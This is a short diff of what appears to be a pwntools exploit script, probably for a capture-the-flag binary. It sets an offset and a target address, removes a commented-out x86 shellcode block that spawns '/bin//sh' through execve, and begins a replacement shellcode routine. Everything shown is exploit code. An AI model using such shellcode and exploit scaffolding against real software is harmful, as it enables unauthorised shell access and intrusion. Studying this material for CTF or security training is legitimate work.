@@ -8,22 +8,6 @@ context.arch = 'amd64'
 offset = 248
 addr = 0x601080
 
-"""
-sc = asm('''
-    xor rax, rax
-    push rax
-    push dword 0x68732f2f
-    push dword 0x6e69622f
-    mov rbx, rsp
-    push rax
-    push rbx
-    mov rcx, rsp
-    cdq
-    mov al,0xb
-    int 0x80
-    ''')
-"""
-
 sc2 = asm('''
         xor rax, rax
         xor rdx, rdx
